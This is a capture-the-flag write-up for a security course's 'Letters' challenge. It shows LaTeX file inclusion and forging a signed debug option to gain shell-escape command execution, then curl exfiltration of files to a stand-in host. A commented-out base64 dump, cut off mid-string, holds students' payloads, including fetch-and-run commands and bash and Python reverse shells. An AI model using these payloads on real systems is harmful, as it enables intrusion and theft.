---
title: "Course CTF: Week 5 & 6"
date: 2020-06-25T22:31:19+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Letters

Site: letters.-QBSITE-

## LFI

If we look at the source code of the app, we can see that our input is inserted into a markdown file, which is then processed with a template through `pandoc`. There is a route `/flag` that is only accessible by the administrator account - which when accessed will return the contents of the file `/flag`.

LaTeX allows us to insert data from the filesystem with `\input{FILENAME}`

So we can enter in `\input{/flag}`, and the generated PDF should give us the flag

> `COMP6443{IWonderWhatThatDebugOptionIsFor}`

## RCE

The debug option seems to allow extra parameters to be passed into `pandoc` through `--latex-engine-opt`.  
However it appears to be signed, and we need to know the signing key.  

Thankfully we do know it, from the `/key` file!  
Through inserting `\input{/key}` into the markdown, we can get the key `imagineUsingW0rd`.  
Here we can use the `itsdangerous` Python library to generate a signed version of whatever we want to pass in.  

```
s = itsdangerous.Signer("imagineUsingW0rd")
```

We can execute arbitrary commands in LaTeX with `\immediate\write18{YOUR_SCRIPT_HERE}` or `\input{|"YOUR_SCRIPT_HERE"}. However, we need to pass the `-shell-escape` option to the LaTeX engine... which is where the debug option comes in!

```
s.sign(b"-shell-escape")
# b'-shell-escape.ZYO1d05uy-FCZuQ_fSzoDfjkipM'
```

By using this as our debug option, we can now perform some remote code execution on the server!

The first few things we want to check is what the filesystem looks like.  
If trying to execute `ls` on its own, we get some syntax errors (as LaTeX then tries to process the RCE output as LaTeX syntax) - so we can `base64` encode it to receive it successfully.


```
\input{|"echo $(ls / | base64)"}
# YWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZgphcHAKYmluCmJvb3QKZGV2CmV0YwpmbGFnCmhvbWUKand0UlMyNTYua2V5LnB1YgprZXkKbGliCmxpYjY0Cm1lZGlhCm1udApvcHQKcHJvYwpxdW9jY2FiYW5rLnBuZwpyb290CnJ1bgpzYmluCnNydgpzeXMKdG1wCnVzcgp2YXIK
```

This gives us some files of interest to exfiltrate - especially `admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf`!

```
\input{|"base64 /admin_539f98bf-9a52-4bc0-bf34-1ffaba10997c.pdf > /tmp/b; curl -d '@/tmp/b' -X POST https://my.collection.site"}
```

> `COMP6443{I_CAN_INJECT_THE_ENTIRE_WORLD}`

_We can also make a backup of some files, as it's a bit annoying to keep b64 decoding (no netcat on the server!):  
`\input{|"tar -czf - . | base64 > /tmp/hello.tar; curl -d "@/tmp/hello.tar" -X POST https://my.collection.site"}`_

<!-- _Here's a dump of people's RCE attempts :)_

aGVsbG8gd29ybGRcaW5wdXR7fGxzIC4vZXh0ZXJuYWx9XGlucHV0e3wibHMgL2V0YyJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmInwiYmFzZTY0In1caW5wdXR7fCJzdHJpbmdzIC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmInwiYmFzZTY0In1caW5wdXR7fCJncmVwIC1lIENPTVA2NDQzIC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmIC8ifCJiYXNlNjQifVxpbnB1dHt8Ii9iaW4vbHMifVxpbnB1dHt8ImNhdCAvZXRjL2Jhc2guYmFzaHJjInwi Ym-FzZTY0In1caW5wdXR7fCIvYmluL2xzICdjaGFsbGVuZ2VzXycifVxpbnB1dHt8L2Jpbi9scyBj aGFs-bGVuZ2VzL2V4dGVybmFsfVxpbnB1dHt8Ii9iaW4vbHMgJ2NoYWxsZW5nZXMnICQifVxpbnB1 dHt8ImxzIC4vY29tcDY0NDMifCJiYXNlNjQifVxpbnB1dHt8ImNhdCBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvX19pbml0X18ucHljInwiYmFzZTY0In1caW5wdXR7fGxzICJleHRlcm5hbCJ9XGlu cHV0e3wiL2Jpbi9jYXQgL2ZsYWcifVxpbnB1dHt8ImxzIC1sICAvaG9tZSJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IC9qd3RSUzI1Ni5rZXkucHViInwiYmFzZTY0In1caW5wdXR7fCJjYXQgY2hhbGxl bmdlcy93ZWVrNC9sZXR0ZXJzL3J1bi5weSJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzL2FwcC90ZW1wbGF0ZSJ8ImJhc2U2NCJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcyAtSSBcXCQuKiAifWNhdCA8PEVPRj54LnRleA0KXGRvY3VtZW50Y2xhc3N7YXJ0aWNsZX0NClxiZWdpbntkb2N1bWVudH0NClxpbW1lZGlhdGVcd3JpdGUxOHt1bmFtZSAtYX0NClxlbmR7ZG9jdW1lbnR9DQpFT0ZcaW5wdXR7fCIvYmluL2xzICckY2hhbGxlbmdlcycifVxpbnB1dHt8bHMgLi9jaGFsbGVuZ2Vz L2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXN9XGlucHV0e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9ydW4ucHkifCJiYXNlNjQifVxpbnB1dHt8L2Jpbi9scyBjaGFsbGVuZ2VzL2V4dGVybmFsL2No YWxsZW5nZXN9XGlucHV0e3wic3RyaW5ncyAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9DQpcaW5wdXR7L2FkbWluXzUzOWY5OGJmLTlhNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGZ9XGlucHV0e3wibHMgLWwgLyJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycyJ8ImJhc2U2NCJ9XGlucHV0e3xscyAqIH1caW5wdXR7fCJscyAtbCAvInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzIC1JICpc JCo-gIn1caW5wdXR7fCIvYmluL2xzICdjaGFsbGVuZ2VzJyJ9XGlucHV0e3wvYmluL2xzICdjaGFs bGVuZ2VzL2V4dGVybmFsL2NoYWxsZW5nZXMnfVxpbnB1dHt8Ii9iaW4vbHMgJ2NoYWxsZW5nZXMnInwgIiJ9XGlucHV0e3xgbHMgZXh0ZXJuYWxgfVxpbnB1dHt8ImZpbmQgLyAtbmFtZSBmbGFnInwiYmFzZTY0In1caW5wdXR7fCJ6Y2F0IC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmInwiYmFzZTY0In1caW5wdXR7fCIvYmluL2xzIGNoYWxsZW5nZXMifVxpbnB1dHt8ImdyZXAgQ09NUDY0NDMgL2FkbWluXzUzOWY5OGJmLTlhNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGYifCJiYXNlNjQifQ0KXGltbWVkaWF0ZVx3cml0ZTE4e2VudiA+IG91dHB1dH0NClxpbnB1dHtvdXRwdXR9XGlucHV0e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9hcHAvaGVscGVycy5weSJ8ImJhc2U2NCJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcyAnJCJ9XGlucHV0e3widGFy IC1jeiAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmInwiYmFzZTY0In1caW5wdXR7fGxzIC4vY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXN9XGlucHV0e3wiZ3JlcCAtcm53IC8gLWUgQ09NUDY0NDN7InwiYmFzZTY0In1caW5wdXR7fCJjYXQgZXRjL3Bhc3Nwd2QifVxpbnB1dHt8ImNhdCBldGMvcGFzc3B3ZCJ8ImJhc2U2NCJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcyJ8ImJhc2U2NCJ9DQpcaW5wdXR7Li9jaGFsbGVuZ2VzL19faW5pdF9fLnB5fVxpbnB1dHt8ImdyZXAgQ09NUDY0NDMgL2FkbWluXzUzOWY5OGJmLTlhNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGYifCJiYXNlNjQifVxpbnB1dHt8bHN9DQpcaW5wdXR7fGxzIGNoYWxsZW5nZXN9XGlucHV0e3wicGluZyBnb29nbGUuY29tInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzInwiYmFzZTY0In0NClxpbnB1dHsuL2NoYWxsZW5nZXMvX19pbml0X18ucHl9XGlucHV0e3xscyBleHRlcm5hbH1caW5wdXR7fCJjYXQgLi4vX19pbml0X18ucHkifCJiYXNlNjQifVxpbnB1dHt8Ii9iaW4vbHMgJ2NoYWxs ZW5nZXMnIn1caW5wdXR7fGxzfVxkZWYgXGltbSB7XHN0cmluZ1xpbW1lfQ0KXGRlZiBcZGlhdGUg
e2RpYXRlfQ0KXGRlZiBcZWlnaHRlZW4ge1xzdHJpbmcxOH0NClxkZWYgXHd3cml0ZSB7XHN0cmluZ1x3cml0ZVxlaWdodGVlbn0NClxkZWYgXGFyZ3Mge1xzdHJpbmd7bHMgfGJhc2U2ND4gdGVzdC50ZXhcc3RyaW5nfX0NClxkZWYgXGlucCB7XHN0cmluZ1xpbn0NClxkZWYgXGlwdXQge3B1dH0NClxkZWYgXGNtZCB7XHN0cmluZ3t0ZXN0LnRleFxzdHJpbmd9fQ0KDQolIEZpcnN0IHJ1bg0KXG5ld3dyaXRlXG91dGZpbGUNClxvcGVub3V0XG91dGZpbGU9Y21kLnRleA0KXHdyaXRlXG91dGZpbGV7XGltbVxkaWF0ZVx3d3JpdGVcYXJnc30NClx3cml0ZVxvdXRmaWxle1xpbnBcaXB1dFxjbWR9DQpcY2xvc2VvdXRcb3V0ZmlsZQ0KDQolIFNlY29uZCBydW4NClxuZXdyZWFkXGZpbGUNClxvcGVuaW5cZmlsZT1jbWQudGV4DQpcbG9vcFx1bmxlc3NcaWZlb2ZcZmlsZQ0KICAgIFxyZWFkXGZpbGUgdG9cZmlsZWxpbmUgDQogICAgXGZpbGVsaW5lDQpccmVwZWF0DQpcY2xvc2VpblxmaWxlDQpSdW4xXGlucHV0e3xscyAuL2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXN9XGlucHV0e3wibHMgJCJ9XGlucHV0e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQifCJiYXNlNjQifVxpbnB1dHt8ImxzIC1sIGNoYWxsZW5nZXMvd2VlazQifCJiYXNlNjQifVxpbnB1dHt8bHN9XGlucHV0e3wibHMgZXh0ZXJuYWwifWhlbGxvIHdvcmxkXGltbWVkaWF0ZXtcd3JpdGUxOHt8bHMgPiB0ZW1wLmRhdH19DQpcaW5wdXR7fGxzIH1caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0InwiYmFzZTY0In1caW5wdXR7fGxzIH1caW5wdXR7fCIvYmluL2xz ICd-jaGFsbGVuZ2VzL2wuMScifVxpbnB1dHt8Ii9iaW4vbHMgJyRjaGFsbGVuZ2VzJyJ9XGlucHV0 e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9pbWFnZS5iaW5hcnkifCJiYXNlNjQifVxpbnB1dHt8bHMgPiBmaWxlLnRtcCB9DQpcaW5wdXR7ZmlsZS50bXB9XGlucHV0e3wiZmluZCAuIC1uYW1lIGZsYWcifCJiYXNlNjQifVxpbnB1dHt8Y2F0IC9mbGFnfVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMgLUkgJyokKicgIn1caW5wdXR7fGxzIC4vY2hhbGxlbmdlcy9jaGFsbGVuZ2VzL2NoYWxsZW5nZXMvY2hhbGxlbmdlcy9jaGFsbGVuZ2VzfVxpbnB1dHt8ImNhdCAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IC9ldGMvcGFzc3B3ZCJ8ImJhc2U2NCJ9DQpcaW5wdXR7L2V0Yy9wYXNzcHdkfVxpbnB1dHt8InN0cmluZ3MgY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzL2ltYWdlLmJpbmFyeSJ8ImJhc2U2NCJ9XGlucHV0e3wi L2Jpbi9scyAnY2hhbGxlbmdlcycgJDEifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMgLUkgJyQqJyAifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycyJ8ImJhc2U2NCJ9DQpcaW5wdXR7Li9jaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvcnVuLnB5fVxpbnB1dHt8Ii9iaW4vZ3JlcCAtUmls IENPTVA2NDQzIC8ifCJiYXNlNjQifVxpbnB1dHt8ImxzIC9ldGMifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9hcHAvInwiYmFzZTY0In1caW5wdXR7fCJjYXQgL2V0Yy9wYXNzcHdkInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvYXBwL3N0YXRpYyJ8ImJhc2U2NCJ9XGlucHV0e3xscyB8fVxpbnB1dHt8ImJ6aXAyIC1kYyAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9XGlucHV0e3wiL3Vzci9sb2NhbC9iaW4vY2F0IGZsYWcifVxpbnB1dHt8ImxzIH4ifCJiYXNlNjQifVxpbnB1dHt8 ImxzIC1sICAvInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzIC1JICcqXCQqJyAifVxpbnB1dHt8Ii9iaW4vbHMgY2hhbGxlbmdlcyJ9XGlucHV0e3wiZmluZCAuIC1uYW1lIGZsYWdcKiJ8 ImJhc2U2NCJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcyAtSSBcJC4qICJ9XGlucHV0e3xsc3xjaGFsbGVuZ2VzfVxpbnB1dHt8ImNhdCAvZXRjL3Bhc3N3ZC0ifCJiYXNlNjQifVxpbnB1dHt8ImNhdCAv ZXRjL3VjZi5jb25mInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMifCJiYXNlNjQifQ0KXGlucHV0ey4vY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzL19faW5pdF9f LnB5fVxpbnB1dHt8bHMgIGNoYWxsZW5nZXMvY2hhbGxlbmdlc31caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMifCJiYXNlNjQifVxpbnB1dHt8ImxzIC1hbCAvInwiYmFzZTY0In1c aW5wdXR7fCIvdXNyL2Jpbi9jYXQgL2ZsYWcifVxpbnB1dHt8ImxzIC1hbCAvaG9tZSJ8ImJhc2U2NCJ9XGlucHV0e3wibHMgY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzLyJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9hcHAvdGVtcGxhdGVzL2luZGV4Lmh0bWwifCJiYXNlNjQifVxpbnB1dHt8ImJhc2U2NCBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvcnVuLnB5 YyJ9XGlucHV0e3xsc31caW5wdXR7fCJscyAtbCAgL2FwcC9jaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvaW1hZ2UuYmluYXJ5InwiYmFzZTY0In1caW5wdXR7fCJscyBleHRlcm5hbC9jb21wNjQ0My9jaGFsbGVuZ2VzInwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMv YXBwL3RlbXBsYXRlcyJ8ImJhc2U2NCJ9XGlucHV0e3wiZWNobyAjID4+IGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9ydW4ucHkifVxpbnB1dHt8bHN8ZXh0ZXJuYWx9XGlucHV0e3xsc30NClxpbnB1dHtjaGFsbGVuZ2VzL2ZsYWd9XGlucHV0e3wiZ3JlcCBDT01QNjQ0MyAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9DQpcd3JpdGUxOHtlbnYgPiBvdXRwdXR9DQpcaW5wdXR7b3V0cHV0fVxpbnB1dHt8ImNhdCBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMvcnVuLnB5YyJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IC1sIC9hZG1pbl81MzlmOThiZi05 YTUyL-TRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmInwiYmFzZTY0In1caW5wdXR7fCJ1bmFtZSAtYSJ8ImJhc2U2NCJ9XGlucHV0e3wibHMgL2JpbiJ8ImJhc2U2NCJ9XGlucHV0e3wiZW52InwiYmFz ZTY0In1caW5wdXR7fC9iaW4vbHMgY2hhbGxlbmdlc31caW5wdXR7fCJ3aGljaCBncmVwInwiYmFzZTY0In1caW5wdXR7fCJmaW5kIGZsYWcgIn1caW5wdXR7fCIvdXNyL2xvY2FsL2Jpbi9jYXQgZmxhZyA+IHRtcC50eHQifQ0KXGlucHV0e3RtcC50eHR9XGlucHV0e3wicGRmaW5mbyAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ8ImJhc2U2NCJ9XGlucHV0e3wi
bHMgLWwgIC9yb290InwiYmFzZTY0In1caW5wdXR7fCJscyBjaGFsbGVuZ2VzL3dlZWs0L2xldHRl cn-MifCJiYXNlNjQifVxpbnB1dHt8ImNhdCAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiJ9XGlucHV0e3wibHMgZXh0ZXJuYWwifCJiYXNlNjQifVxpbnB1dHt8bHMgIGNoYWxsZW5nZXN9XGlucHV0e3wiY2F0IC9ldGMvcGFzc3dkInwiYmFzZTY0In1caW5wdXR7fCJscyAtYWwgY2hhbGxlbmdlcy93ZWVrNCJ8ImJhc2U2NCJ9XGlucHV0e3wiY2F0IGV0Yy9wYXNzd2QifCJiYXNlNjQifVxpbnB1dHt8IndoaWNoIHBkZmluZm8ifCJiYXNlNjQifVxpbnB1dHt8Imxz IC1sICAvYXBwL2NoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9pbWFnZS5iaW5hcnkifCJiYXNlNjQifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMifCJiYXNlNjQifVxpbnB1dHt8ImxzIC1sICAvInwiYmFz ZTY0In1caW5wdXR7fCIvYmluL2xzIGNoYWxsZW5nZXMifVxpbnB1dHt8ImJhc2U2NCAtaSAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiAtbyAvdGVzdCJ8ImJhc2U2NCJ9XGlucHV0e3wiZ3JlcCAtcm53ICcvJyAtZSAnQ09NUDY0NDN7JyJ8ImJhc2U2NCJ9XGlucHV0e3wiZ3JlcCAvZmxhZyAtZSBDT01QNjQ0M3sifCJiYXNlNjQifVxpbnB1dHt8ImxzIGNoYWxs ZW5nZXMvd2VlazQvbGV0dGVycy9ydW4ucHkifCJiYXNlNjQifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycyJ8ImJhc2U2NCJ9DQpcaW5wdXR7fCJjYXQgY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzInwiYmFzZTY0In1caW5wdXR7fCJscyAtbCAvInwiYmFzZTY0In1caW5wdXR7fCJlbnYifCJiYXNlNjQifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMvd2VlazQvbGV0dGVycy9hcHAifCJiYXNlNjQifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMkIn1caW5wdXR7fCJjYXQgY2hhbGxlbmdlcy93ZWVrNC9sZXR0ZXJzL3J1bi5weWMifVxpbnB1dHt8ImxzIC1sICAvcm9vdCJ8ImJhc2U2NCJ9XGlucHV0e3xscyB+fVxpbnB1dHt8Ii9iaW4vbHMgIn1caW5w dXR7fCIvdXNyL2xvY2FsL2Jpbi9jYXQgL2ZsYWcifVxpbnB1dHt8ImxzIGV4dGVybmFsL2NvbXA2NDQzInwiYmFzZTY0In1caW5wdXR7fCJscyAtbCBjaGFsbGVuZ2VzL3dlZWs0L2xldHRlcnMifCJi YXNl-NjQifVxpbnB1dHt8bHMgZXh0ZXJuYWwxMjN9XGlucHV0e3xscyAuL2NoYWxsZW5nZXMvY2hh bGxlb-mdlcy9jaGFsbGVuZ2VzfVxpbnB1dHsnfCIvYmluL2xzIGNoYWxsZW5nZXMiJ31caW5wdXR7 fCJs-cyJ9XGlucHV0e3wibHMgLWwifCJiYXNlNjQifVxpbnB1dHt8ImdyZXAgL2FkbWluXzUzOWY5 OGJmLTl-hNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGYgQ09NUDY0NDMifCJiYXNlNjQifVxp bnB1dHt8ImxzIC4uLyJ8ImJhc2U2NCJ9XGlucHV0e3wibHMifCJiYXNlNjQifWhlbGxvIHdvcmxkJyBvciAxPTEjaGVsbG8gd29ybGRcaW5jbHVkZXsvZmxhZy50eHR9XGlucHV0e3wiZWNobyBhPi90bXAvaGVsbG8udHh0OyBlY2hvICQoY3VybCAtLXVwbG9hZC1maWxlIC90bXAvaGVsbG8udHh0IGh0dHBzOi8vdHJhbnNmZXIuc2gvaGVsbG8udHh0KSJ9XGlucHV0e3wiZWNobyBhPi90bXAvaGVsbG8udHh0OyBjdXJsIC0tdXBsb2FkLWZpbGUgL3RtcC9oZWxsby50eHQgaHR0cHM6Ly90cmFuc2Zlci5z aC9oZWxsby50eHQifVxpbnB1dHt8ImN1cmwgaHR0cDovL2NzZS51bnN3LmVkdS5hdTo4MDAwIn1caW5wdXR7fCJscyAvIn1caW5wdXR7fCJ0YXIgLWN6ZiAtIC4gfCBiYXNlNjQgPiAvdG1wL2hlbGxvLnRhcjsgY3VybCAtZCAiQC90bXAvaGVsbG8udGFyIiAtWCBQT1NUIGh0dHA6Ly8xMjkuOTQuMjQyLjE5OjgwODAifVxpbnB1dHt8IndoaWNoIGN1cmwifVxpbnB1dHt8ImNhdCAvKi5tZCB8IGJhc2U2 NCJ9XGlucHV0e3wiYmFzZTY0IC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmID4gL3RtcC9iOyBjdXJsIC1kICdAL3RtcC9iJyAtWCBQT1NUIGh0dHA6Ly8xMjkuOTQuMjQyLjE5OjgwODAifVxpbnB1dHt8InRhciAtY3pmIHJlZS5hIC47IGN1cmwgLS11cGxvYWQtZmlsZSAuL3JlZS5hIGh0dHBzOi8vdHJhbnNmZXIuc2gvcmVlLmEifVxpbnB1dHt8ImxzIn1caW5w dXR7fCJ0YXIgLWN6ZiAvdG1wL2hlbGxvLnRhciAuOyBjdXJsIC1kICJAL3RtcC9oZWxsby50YXIiIC1YIFBPU1QgaHR0cDovLzEyOS45NC4yNDIuMTk6ODA4MCJ9XGlucHV0e3wiZWNobyBhPi90bXAvYjsgZWNobyAkKGN1cmwgLS11cGxvYWQtZmlsZSAvdG1wL2IgaHR0cDovL2tlZXAuc2gpIn1caW5wdXR7L2ZsYWd9XGlucHV0e3wibHMgL3RtcCB8IGJhc2U2NCJ9XGlucHV0e3wiZWNobyAkKGxzIC8gfCBiYXNlNjQpIn1caW5wdXR7fCJ3aGljaCBuZXRjYXQifVxpbnB1dHsvZmxhZ31caW5wdXR7fCJjdXJsIC1kICckKGJhc2U2NCAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiknIC1YIFBPU1QgaHR0cDovLzEyOS45NC4yNDIuMTk6ODA4MCJ9XGlucHV0e3wiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjkuOTQuMjQyLjE5LzgwODAgMD4mMSJ9XGlucHV0e3wiZWNobyBhPmI7IGVjaG8gJChjdXJsIC0tdXBsb2FkLWZpbGUgLi9iIGh0dHBzOi8vdHJhbnNmZXIuc2gvcmVl LmEpIn1caW5wdXR7fCJlY2hvIGhpICJ9XGlucHV0e3wibHMgLyAtbCJ9XGluY2x1ZGV7ZmxhZy50eHR9XGlucHV0e3wibHMgLTEgLyJ9XGlucHV0ey9mbGFnfVxpbnB1dHt8ImxzIC0xIGNoYWxsZW5nZXMgfCBiYXNlNjQifVxpbnB1dHt8IndoaWNoIG5jIn1caW5wdXR7fCJjYXQgL3RtcC8qLm1kIHwgYmFzZTY0In1caW5wdXR7fCJlY2hvIGE+aGVsbG8udHh0OyBjYXQgaGVsbG8udHh0OyBscyJ9XGlucHV0e3wicGluZyBnb29nbGUuY29tIn1caW5wdXR7L2ZsYWd9XGlucHV0e3wiZWNobyAkKGxzKSJ9XGlucHV0e3wic291cmNlIDwoY3VybCAtcyBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDAwL2RvaXQuc2gpIn1caW5wdXR7fCJlY2hvICQoY3VybCAtLXVwbG9hZC1maWxlIC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmIGh0dHBzOi8va2VlcC5zaCkifVxpbnB1dHt8InRhciAtY3pmIC90bXAvaGVsbG8udGFyIC47IGN1cmwgLWQgIkAvdG1wL2hlbGxvLnRhciIgLVgg UE9TVCBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwIn1caW5wdXR7fCJ3aGljaCBweXRob24ifVxpbnB1dHt8ImN1cmwgLWQgIkAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiIgLVggUE9TVCBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwL2RhdGEifVxpbnB1dHt8
ImxzIC0xIC8ifVxpbnB1dHt8ImxzIGNoYWxsZW5nZXMifVxpbnB1dHt8ImVjaG8gYT4vdG1wL2hl bGxvLnR4dDsgY2F0IC90bXAvaGVsbG8udHh0OyBscyJ9XGlucHV0e3wiY3VybCAtZCAiQC9hZG1pbl81MzlmOThiZi05YTUyLTRiYzAtYmYzNC0xZmZhYmExMDk5N2MucGRmIiAtWCBQT1NUIGh0dHA6Ly8xMjkuOTQuMjQyLjE5OjgwODAvZGF0YSJ9XGlucHV0ey9mbGFnfVxpbnB1dHt8ImVjaG8gJChjdXJsIC0tdXBsb2FkLWZpbGUgL2FkbWluXzUzOWY5OGJmLTlhNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGYgaHR0cDovL2tlZXAuc2gpIn1caW5wdXR7L2ZsYWd9XGlucHV0ey9mbGFnfVxpbnB1dHt8ImVjaG8gYT5oZWxsby50eHQ7IGNhdCBoZWxsby50eHQ7IGxzIn1caW5wdXR7fCJlY2hvICQobHMgLykifVxpbnB1dHsvZmxhZ31caW5wdXR7fCJlY2hvIGE+YjsgY3VybCAtLXVwbG9hZC1maWxlIC4vcmVlLmEgaHR0cHM6Ly90cmFuc2Zlci5zaC9yZWUuYSJ9XGlucHV0ey9mbGFnfVxpbnB1dHt8ImVjaG8gYT4vdG1wL2hlbGxvLnR4dDsgY3VybCAtLXVwbG9hZC1maWxlIC90bXAvaGVsbG8udHh0IGh0dHBzOi8vdHJhbnNmZXIuc2gvaGVsbG8udHh0ICJ9XGlucHV0e3widGFyIC1jemYgLSAuIHwg Y3VybCAtWCBQT1NUIC1kIFwiJCg8L2Rldi9zdGRpbilcIiBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwIn1caW5wdXR7fCJscyAtMSAvIHwgYmFzZTY0In1caW5wdXR7fCd3aGljaCB3Z2V0Jyd9XGlucHV0e3wncHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29j a2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTI5Ljk0LjI0Mi4xOSIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jyd9XGlucHV0e3wiY3VybCAtcyBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDAwL2RvaXQuc2gifVxpbnB1dHt8InRhciAtY3pmIC0gLnwgYmFzZTY0In1caW5wdXR7fCJlY2hvIGE+YjsgY3Vy 